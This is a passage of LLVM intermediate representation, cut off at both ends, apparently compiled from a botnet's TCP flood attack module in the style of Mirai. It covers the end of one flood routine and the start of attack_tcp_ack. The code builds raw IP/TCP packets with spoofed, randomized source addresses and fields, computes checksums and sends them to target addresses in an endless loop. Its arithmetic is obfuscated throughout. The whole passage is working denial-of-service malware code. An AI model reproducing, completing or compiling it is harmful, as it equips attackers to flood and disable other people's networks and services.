  %451 = getelementptr inbounds i8, i8* %450, i32 1
  store i8* %451, i8** %29, align 8
  store i8 3, i8* %450, align 1
  %452 = load i8*, i8** %29, align 8
  %453 = getelementptr inbounds i8, i8* %452, i32 1
  store i8* %453, i8** %29, align 8
  store i8 3, i8* %452, align 1
  %454 = load i8*, i8** %29, align 8
  %455 = getelementptr inbounds i8, i8* %454, i32 1
  store i8* %455, i8** %29, align 8
  store i8 6, i8* %454, align 1
  br label %456

; <label>:456:                                    ; preds = %192
  %457 = load i32, i32* %9, align 4
  %458 = sub i32 0, %457
  %459 = sub i32 0, 1
  %460 = add i32 %458, %459
  %461 = sub i32 0, %460
  %462 = add nsw i32 %457, 1
  store i32 %461, i32* %9, align 4
  br label %108

; <label>:463:                                    ; preds = %108
  br label %464

; <label>:464:                                    ; preds = %640, %463
  store i32 0, i32* %9, align 4
  br label %465

; <label>:465:                                    ; preds = %634, %464
  %466 = load i32, i32* %9, align 4
  %467 = load i8, i8* %5, align 1
  %468 = zext i8 %467 to i32
  %469 = icmp slt i32 %466, %468
  br i1 %469, label %470, label %640

; <label>:470:                                    ; preds = %465
  %471 = load i8**, i8*** %11, align 8
  %472 = load i32, i32* %9, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds i8*, i8** %471, i64 %473
  %475 = load i8*, i8** %474, align 8
  store i8* %475, i8** %30, align 8
  %476 = load i8*, i8** %30, align 8
  %477 = bitcast i8* %476 to %struct.iphdr*
  store %struct.iphdr* %477, %struct.iphdr** %31, align 8
  %478 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i64 1
  %480 = bitcast %struct.iphdr* %479 to %struct.tcphdr*
  store %struct.tcphdr* %480, %struct.tcphdr** %32, align 8
  %481 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %482 = load i32, i32* %9, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i64 %483
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i32 0, i32 2
  %486 = load i8, i8* %485, align 4
  %487 = zext i8 %486 to i32
  %488 = icmp slt i32 %487, 32
  br i1 %488, label %489, label %512

; <label>:489:                                    ; preds = %470
  %490 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %491 = load i32, i32* %9, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i64 %492
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i32 0, i32 1
  %495 = load i32, i32* %494, align 4
  %496 = call i32 @ntohl(i32 %495) #7
  %497 = call i32 @rand_next()
  %498 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i32 0, i32 2
  %503 = load i8, i8* %502, align 4
  %504 = zext i8 %503 to i32
  %505 = lshr i32 %497, %504
  %506 = sub i32 0, %505
  %507 = sub i32 %496, %506
  %508 = add i32 %496, %505
  %509 = call i32 @htonl(i32 %507) #7
  %510 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 9
  store i32 %509, i32* %511, align 4
  br label %512

; <label>:512:                                    ; preds = %489, %470
  %513 = load i32, i32* %26, align 4
  %514 = icmp eq i32 %513, -1
  br i1 %514, label %515, label %519

; <label>:515:                                    ; preds = %512
  %516 = call i32 @rand_next()
  %517 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %518 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %517, i32 0, i32 8
  store i32 %516, i32* %518, align 4
  br label %519

; <label>:519:                                    ; preds = %515, %512
  %520 = load i16, i16* %13, align 2
  %521 = zext i16 %520 to i32
  %522 = icmp eq i32 %521, 65535
  br i1 %522, label %523, label %536

; <label>:523:                                    ; preds = %519
  %524 = call i32 @rand_next()
  %525 = xor i32 %524, -1
  %526 = xor i32 65535, -1
  %527 = xor i32 1478825447, -1
  %528 = or i32 %525, %526
  %529 = or i32 1478825447, %527
  %530 = xor i32 %528, -1
  %531 = and i32 %530, %529
  %532 = and i32 %524, 65535
  %533 = trunc i32 %531 to i16
  %534 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 3
  store i16 %533, i16* %535, align 4
  br label %536

; <label>:536:                                    ; preds = %523, %519
  %537 = load i16, i16* %16, align 2
  %538 = zext i16 %537 to i32
  %539 = icmp eq i32 %538, 65535
  br i1 %539, label %540, label %549

; <label>:540:                                    ; preds = %536
  %541 = call i32 @rand_next()
  %542 = xor i32 65535, -1
  %543 = xor i32 %541, %542
  %544 = and i32 %543, %541
  %545 = and i32 %541, 65535
  %546 = trunc i32 %544 to i16
  %547 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 0
  store i16 %546, i16* %548, align 4
  br label %549

; <label>:549:                                    ; preds = %540, %536
  %550 = load i16, i16* %17, align 2
  %551 = zext i16 %550 to i32
  %552 = icmp eq i32 %551, 65535
  br i1 %552, label %553, label %566

; <label>:553:                                    ; preds = %549
  %554 = call i32 @rand_next()
  %555 = xor i32 %554, -1
  %556 = xor i32 65535, -1
  %557 = xor i32 -1922961363, -1
  %558 = or i32 %555, %556
  %559 = or i32 -1922961363, %557
  %560 = xor i32 %558, -1
  %561 = and i32 %560, %559
  %562 = and i32 %554, 65535
  %563 = trunc i32 %561 to i16
  %564 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 1
  store i16 %563, i16* %565, align 2
  br label %566

; <label>:566:                                    ; preds = %553, %549
  %567 = load i32, i32* %18, align 4
  %568 = icmp eq i32 %567, 65535
  br i1 %568, label %569, label %573

; <label>:569:                                    ; preds = %566
  %570 = call i32 @rand_next()
  %571 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 2
  store i32 %570, i32* %572, align 4
  br label %573

; <label>:573:                                    ; preds = %569, %566
  %574 = load i32, i32* %19, align 4
  %575 = icmp eq i32 %574, 65535
  br i1 %575, label %576, label %580

; <label>:576:                                    ; preds = %573
  %577 = call i32 @rand_next()
  %578 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 3
  store i32 %577, i32* %579, align 4
  br label %580

; <label>:580:                                    ; preds = %576, %573
  %581 = load i8, i8* %20, align 1
  %582 = icmp ne i8 %581, 0
  br i1 %582, label %583, label %596

; <label>:583:                                    ; preds = %580
  %584 = call i32 @rand_next()
  %585 = xor i32 %584, -1
  %586 = xor i32 65535, -1
  %587 = xor i32 857396124, -1
  %588 = or i32 %585, %586
  %589 = or i32 857396124, %587
  %590 = xor i32 %588, -1
  %591 = and i32 %590, %589
  %592 = and i32 %584, 65535
  %593 = trunc i32 %591 to i16
  %594 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 7
  store i16 %593, i16* %595, align 2
  br label %596

; <label>:596:                                    ; preds = %583, %580
  %597 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 7
  store i16 0, i16* %598, align 2
  %599 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %600 = bitcast %struct.iphdr* %599 to i16*
  %601 = call zeroext i16 @checksum_generic(i16* %600, i32 20)
  %602 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 7
  store i16 %601, i16* %603, align 2
  %604 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 6
  store i16 0, i16* %605, align 4
  %606 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %607 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %608 = bitcast %struct.tcphdr* %607 to i8*
  %609 = call zeroext i16 @htons(i16 zeroext 40) #7
  %610 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %606, i8* %608, i16 zeroext %609, i32 40)
  %611 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 6
  store i16 %610, i16* %612, align 4
  %613 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 1
  %615 = load i16, i16* %614, align 2
  %616 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %617 = load i32, i32* %9, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i64 %618
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i32 0, i32 0
  %621 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %620, i32 0, i32 1
  store i16 %615, i16* %621, align 2
  %622 = load i32, i32* %10, align 4
  %623 = load i8*, i8** %30, align 8
  %624 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %625 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %626 = load i32, i32* %9, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %625, i64 %627
  %629 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i32 0, i32 0
  %630 = bitcast %struct.sockaddr_in* %629 to %struct.sockaddr*
  store %struct.sockaddr* %630, %struct.sockaddr** %624, align 8
  %631 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %632 = load %struct.sockaddr*, %struct.sockaddr** %631, align 8
  %633 = call i64 @sendto(i32 %622, i8* %623, i64 60, i32 16384, %struct.sockaddr* %632, i32 16)
  br label %634

; <label>:634:                                    ; preds = %596
  %635 = load i32, i32* %9, align 4
  %636 = sub i32 %635, 1803620107
  %637 = add i32 %636, 1
  %638 = add i32 %637, 1803620107
  %639 = add nsw i32 %635, 1
  store i32 %638, i32* %9, align 4
  br label %465

; <label>:640:                                    ; preds = %465
  br label %464

; <label>:641:                                    ; preds = %104, %98
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %610

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %610

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %420, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %425

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 15, -1
  %145 = xor i8 %143, %144
  %146 = and i8 %145, %143
  %147 = and i8 %143, 15
  %148 = and i8 %146, 64
  %149 = xor i8 %146, 64
  %150 = or i8 %148, %149
  %151 = or i8 %146, 64
  store i8 %150, i8* %142, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = xor i8 %154, -1
  %156 = xor i8 -16, -1
  %157 = xor i8 -92, -1
  %158 = or i8 %155, %156
  %159 = or i8 -92, %157
  %160 = xor i8 %158, -1
  %161 = and i8 %160, %159
  %162 = and i8 %154, -16
  %163 = and i8 %161, 5
  %164 = xor i8 %161, 5
  %165 = or i8 %163, %164
  %166 = or i8 %161, 5
  store i8 %165, i8* %153, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %26, align 4
  %171 = sext i32 %170 to i64
  %172 = sub i64 0, %171
  %173 = sub i64 40, %172
  %174 = add i64 40, %171
  %175 = trunc i64 %173 to i16
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %123
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %123
  %193 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %28, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = xor i16 -241, -1
  %224 = xor i16 %222, %223
  %225 = and i16 %224, %222
  %226 = and i16 %222, -241
  %227 = and i16 %225, 80
  %228 = xor i16 %225, 80
  %229 = or i16 %227, %228
  %230 = or i16 %225, 80
  store i16 %229, i16* %221, align 4
  %231 = load i8, i8* %20, align 1
  %232 = sext i8 %231 to i16
  %233 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = xor i16 1, -1
  %237 = xor i16 %232, %236
  %238 = and i16 %237, %232
  %239 = and i16 %232, 1
  %240 = shl i16 %238, 13
  %241 = xor i16 -8193, -1
  %242 = xor i16 %235, %241
  %243 = and i16 %242, %235
  %244 = and i16 %235, -8193
  %245 = xor i16 %243, -1
  %246 = xor i16 %240, -1
  %247 = xor i16 12797, -1
  %248 = and i16 %245, 12797
  %249 = and i16 %243, %247
  %250 = and i16 %246, 12797
  %251 = and i16 %240, %247
  %252 = or i16 %248, %249
  %253 = or i16 %250, %251
  %254 = xor i16 %252, %253
  %255 = or i16 %245, %246
  %256 = xor i16 %255, -1
  %257 = or i16 12797, %247
  %258 = and i16 %256, %257
  %259 = or i16 %254, %258
  %260 = or i16 %243, %240
  store i16 %259, i16* %234, align 4
  %261 = load i8, i8* %21, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 1, -1
  %267 = xor i16 %262, %266
  %268 = and i16 %267, %262
  %269 = and i16 %262, 1
  %270 = shl i16 %268, 12
  %271 = xor i16 -4097, -1
  %272 = xor i16 %265, %271
  %273 = and i16 %272, %265
  %274 = and i16 %265, -4097
  %275 = and i16 %273, %270
  %276 = xor i16 %273, %270
  %277 = or i16 %275, %276
  %278 = or i16 %273, %270
  store i16 %277, i16* %264, align 4
  %279 = load i8, i8* %22, align 1
  %280 = sext i8 %279 to i16
  %281 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 4
  %283 = load i16, i16* %282, align 4
  %284 = xor i16 %280, -1
  %285 = xor i16 1, -1
  %286 = xor i16 -26890, -1
  %287 = or i16 %284, %285
  %288 = or i16 -26890, %286
  %289 = xor i16 %287, -1
  %290 = and i16 %289, %288
  %291 = and i16 %280, 1
  %292 = shl i16 %290, 11
  %293 = xor i16 %283, -1
  %294 = xor i16 -2049, -1
  %295 = xor i16 -17112, -1
  %296 = or i16 %293, %294
  %297 = or i16 -17112, %295
  %298 = xor i16 %296, -1
  %299 = and i16 %298, %297
  %300 = and i16 %283, -2049
  %301 = and i16 %299, %292
  %302 = xor i16 %299, %292
  %303 = or i16 %301, %302
  %304 = or i16 %299, %292
  store i16 %303, i16* %282, align 4
  %305 = load i8, i8* %23, align 1
  %306 = sext i8 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 4
  %309 = load i16, i16* %308, align 4
  %310 = xor i16 1, -1
  %311 = xor i16 %306, %310
  %312 = and i16 %311, %306
  %313 = and i16 %306, 1
  %314 = shl i16 %312, 10
  %315 = xor i16 -1025, -1
  %316 = xor i16 %309, %315
  %317 = and i16 %316, %309
  %318 = and i16 %309, -1025
  %319 = xor i16 %317, -1
  %320 = xor i16 %314, -1
  %321 = xor i16 -4567, -1
  %322 = and i16 %319, -4567
  %323 = and i16 %317, %321
  %324 = and i16 %320, -4567
  %325 = and i16 %314, %321
  %326 = or i16 %322, %323
  %327 = or i16 %324, %325
  %328 = xor i16 %326, %327
  %329 = or i16 %319, %320
  %330 = xor i16 %329, -1
  %331 = or i16 -4567, %321
  %332 = and i16 %330, %331
  %333 = or i16 %328, %332
  %334 = or i16 %317, %314
  store i16 %333, i16* %308, align 4
  %335 = load i8, i8* %24, align 1
  %336 = sext i8 %335 to i16
  %337 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %338 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %337, i32 0, i32 4
  %339 = load i16, i16* %338, align 4
  %340 = xor i16 %336, -1
  %341 = xor i16 1, -1
  %342 = xor i16 25729, -1
  %343 = or i16 %340, %341
  %344 = or i16 25729, %342
  %345 = xor i16 %343, -1
  %346 = and i16 %345, %344
  %347 = and i16 %336, 1
  %348 = shl i16 %346, 9
  %349 = xor i16 %339, -1
  %350 = xor i16 -513, -1
  %351 = xor i16 2773, -1
  %352 = or i16 %349, %350
  %353 = or i16 2773, %351
  %354 = xor i16 %352, -1
  %355 = and i16 %354, %353
  %356 = and i16 %339, -513
  %357 = and i16 %355, %348
  %358 = xor i16 %355, %348
  %359 = or i16 %357, %358
  %360 = or i16 %355, %348
  store i16 %359, i16* %338, align 4
  %361 = load i8, i8* %25, align 1
  %362 = sext i8 %361 to i16
  %363 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %364 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 4
  %366 = xor i16 1, -1
  %367 = xor i16 %362, %366
  %368 = and i16 %367, %362
  %369 = and i16 %362, 1
  %370 = shl i16 %368, 8
  %371 = xor i16 %365, -1
  %372 = xor i16 -257, -1
  %373 = xor i16 3607, -1
  %374 = or i16 %371, %372
